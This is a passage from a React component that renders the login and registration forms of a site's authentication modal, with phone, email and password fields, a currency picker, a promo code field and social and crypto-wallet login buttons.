                    <span className="win-dialcode-badge">{loginPhoneCountry.code}</span>
                    <input
                      ref={phoneInputRef}
                      type="tel"
                      className="win-field-input"
                      placeholder="00000 00000"
                      autoComplete="tel"
                      value={loginPhone}
                      onFocus={() => {
                        setIsPhoneFocused(true);
                        setLoginPhoneErr('');
                      }}
                      onBlur={() => setIsPhoneFocused(false)}
                      onChange={(e) => handlePhoneChange(e.target.value, setLoginPhone)}
                    />
                  </div>
                  {loginPhoneErr && <span className="win-field-error-text">{loginPhoneErr}</span>}
                </div>
              ) : (
                <div className="win-field-group">
                  <div className={`win-field-pill${loginEmailErr ? ' win-field-pill--error' : ''}`}>
                    <div className="win-field-prefix-wrap">
                      <EnvelopeIcon />
                    </div>
                    <input
                      type="email"
                      className="win-field-input"
                      placeholder="Email"
                      autoComplete="email"
                      value={loginEmail}
                      onChange={(e) => setLoginEmail(e.target.value)}
                      onFocus={() => setLoginEmailErr('')}
                    />
                  </div>
                  {loginEmailErr && <span className="win-field-error-text">{loginEmailErr}</span>}
                </div>
              )}

              {/* Password Field */}
              <div className="win-field-group">
                <div
                  className={`win-field-pill${
                    isPwdFocused ? ' win-field-pill--focused' : ''
                  }${loginPwdErr ? ' win-field-pill--error' : ''}`}
                >
                  <div className="win-field-prefix-wrap">
                    <LockIcon />
                  </div>
                  <input
                    type="password"
                    className="win-field-input"
                    placeholder="Password"
                    autoComplete="current-password"
                    value={loginPwd}
                    onFocus={() => {
                      setIsPwdFocused(true);
                      setLoginPwdErr('');
                    }}
                    onBlur={() => setIsPwdFocused(false)}
                    onChange={(e) => setLoginPwd(e.target.value)}
                  />
                </div>
                {loginPwdErr && <span className="win-field-error-text">{loginPwdErr}</span>}
              </div>

              {/* Forgot Password Link - Right Aligned, Medium Font */}
              <div className="win-forgot-pwd-wrap">
                <button
                  type="button"
                  className="win-link-blue win-forgot-link"
                  onClick={(e) => e.preventDefault()}
                >
                  Forgot your password?
                </button>
              </div>

              {/* Log in Button - Green, White Text, Medium Weight (NOT Bold!) */}
              <button
                type="submit"
                className="win-btn-submit win-btn-login"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Logging in...' : 'Log in'}
              </button>
            </form>

            {/* Subtle Divider 'or' */}
            <div className="win-divider">
              <span>or</span>
            </div>

            {/* Social Logins: Row 1 (6 icons), Row 2 (1 centered Shield icon) with decreased scale */}
            <div className="win-social-grid">
              <div className="win-social-row">
                <button type="button" className="win-social-btn" aria-label="Log in with Google">
                  <GoogleIcon />
                </button>
                <button type="button" className="win-social-btn" aria-label="Log in with VK">
                  <VkIcon />
                </button>
                <button type="button" className="win-social-btn" aria-label="Log in with Telegram">
                  <TelegramIcon />
                </button>
                <button type="button" className="win-social-btn" aria-label="Log in with Yandex">
                  <YandexIcon />
                </button>
                <button type="button" className="win-social-btn" aria-label="Log in with WalletConnect">
                  <WalletConnectIcon />
                </button>
                <button type="button" className="win-social-btn" aria-label="Log in with MetaMask">
                  <MetaMaskFoxIcon />
                </button>
              </div>
              <div className="win-social-row-center">
                <button type="button" className="win-social-btn" aria-label="Log in with Security Shield">
                  <ShieldIcon />
                </button>
              </div>
            </div>

            {/* Footer Prompt & Switch to Register */}
            <div className="win-footer-switch">
              <div className="win-footer-switch-prompt">Don’t have an account?</div>
              <button
                type="button"
                className="win-link-blue win-footer-register-link"
                onClick={() => {
                  setAuthMode('register');
                  clearAllErrors();
                }}
              >
                Register
              </button>
            </div>
          </div>
        ) : (
          /* ===================================================================
              REGISTRATION VIEW
              =================================================================== */
          <div className="win-auth-card-body">
            <div className="win-auth-header">
              <h2 className="win-auth-title">Registration</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Close"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <form noValidate onSubmit={handleRegisterSubmit} className="win-form">
              {/* Currency */}
              <div className="win-field-group">
                <button
                  type="button"
                  className="win-field-pill win-currency-selector-pill"
                  onClick={() => {
                    setCurrencySearch('');
                    setSubView('currency');
                  }}
                  aria-label="Choose currency"
                >
                  <div className="win-field-prefix-wrap">
                    <CurrencyBadge currency={regCurrency} size={24} />
                  </div>
                  <div className="win-field-vdivider" />
                  <span className="win-currency-selected-name">{regCurrency.name}</span>
                  <ChevronDownIcon className="win-field-chevron" />
                </button>
              </div>

              {/* Phone */}
              <div className="win-field-group">
                <div className={`win-field-pill${regPhoneErr ? ' win-field-pill--error' : ''}`}>
                  <button
                    type="button"
                    className="win-country-prefix-btn"
                    onClick={() => {
                      setCountrySearch('');
                      setSubView('country');
                    }}
                    aria-label="Select country code"
                  >
                    <span className="win-country-prefix-flag">{regCountry.flag}</span>
                    <ChevronDownIcon className="win-prefix-chevron" />
                  </button>
                  <div className="win-field-vdivider" />
                  <span className="win-dialcode-badge">{regCountry.code}</span>
                  <input
                    type="tel"
                    className="win-field-input"
                    placeholder="00000 00000"
                    autoComplete="tel"
                    value={regPhone}
                    onChange={(e) => handlePhoneChange(e.target.value, setRegPhone)}
                    onFocus={() => setRegPhoneErr('')}
                  />
                </div>
                {regPhoneErr && <span className="win-field-error-text">{regPhoneErr}</span>}
              </div>

              {/* Email */}
              <div className="win-field-group">
                <div className={`win-field-pill${regEmailErr ? ' win-field-pill--error' : ''}`}>
                  <div className="win-field-prefix-wrap">
                    <EnvelopeIcon />
                  </div>
                  <div className="win-field-vdivider" />
                  <input
                    type="email"
                    className="win-field-input"
                    placeholder="Email"
                    autoComplete="email"
                    value={regEmail}
                    onChange={(e) => setRegEmail(e.target.value)}
                    onFocus={() => setRegEmailErr('')}
                  />
                </div>
                {regEmailErr && <span className="win-field-error-text">{regEmailErr}</span>}
              </div>

              {/* Password */}
              <div className="win-field-group">
                <div className={`win-field-pill${regPwdErr ? ' win-field-pill--error' : ''}`}>
                  <div className="win-field-prefix-wrap">
                    <LockIcon />
                  </div>
                  <div className="win-field-vdivider" />
                  <input
                    type="password"
                    className="win-field-input"
                    placeholder="Password"
                    autoComplete="new-password"
                    value={regPwd}
                    onChange={(e) => setRegPwd(e.target.value)}
                    onFocus={() => setRegPwdErr('')}
                  />
                </div>
                <div className="win-field-helper-text">At least 8 characters</div>
                {regPwdErr && <span className="win-field-error-text">{regPwdErr}</span>}
              </div>

              {/* Promo code */}
              <div className="win-promo-section">
                <button
                  type="button"
                  className="win-promo-link-btn"
                  onClick={() => setShowPromo(!showPromo)}
                >
                  {showPromo ? '− Hide promo code' : 'Add promo code'}
                </button>
                {showPromo && (
                  <div className="win-promo-input-wrap">
                    <input
                      type="text"
                      className="win-promo-input"
                      placeholder="Enter promo code"
                      value={regPromo}
                      onChange={(e) => setRegPromo(e.target.value)}
                    />
                  </div>
                )}
              </div>

              {/* Terms */}
              <div className="win-terms-group">
                <label className="win-terms-label">
                  <input
                    type="checkbox"
                    className="win-terms-checkbox"
                    checked={regAgreed}
                    onChange={(e) => {
                      setRegAgreed(e.target.checked);
                      if (e.target.checked) setRegAgreedErr('');
                    }}
                  />
                  <span className="win-terms-text">
                    By clicking Register, I accept{' '}
                    <a href="#" className="win-link-blue" onClick={(e) => e.preventDefault()}>
                      the User Agreement
                    </a>
                  </span>
                </label>
                {regAgreedErr && <span className="win-field-error-text">{regAgreedErr}</span>}
              </div>

              <button
                type="submit"
                className="win-btn-submit win-btn-register"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Registering...' : 'Register'}
              </button>
            </form>

            <div className="win-divider">
              <span>or</span>
            </div>

            {/* Social Registration */}
            <div className="win-social-row">
              <button type="button" className="win-social-btn" aria-label="Register with Google">
                <GoogleIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with Telegram">
                <TelegramIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with WalletConnect">
                <WalletConnectIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with MetaMask">
                <MetaMaskFoxIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with Shield">
                <ShieldIcon />
              </button>
            </div>

            <div className="win-footer-switch">
              <span>Already have an account? </span>
              <button
                type="button"
                className="win-link-blue win-footer-register-link"
                onClick={() => {
                  setAuthMode('login');
                  setLoginSubTab('email');
                  clearAllErrors();
                }}
              >
                Log in
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
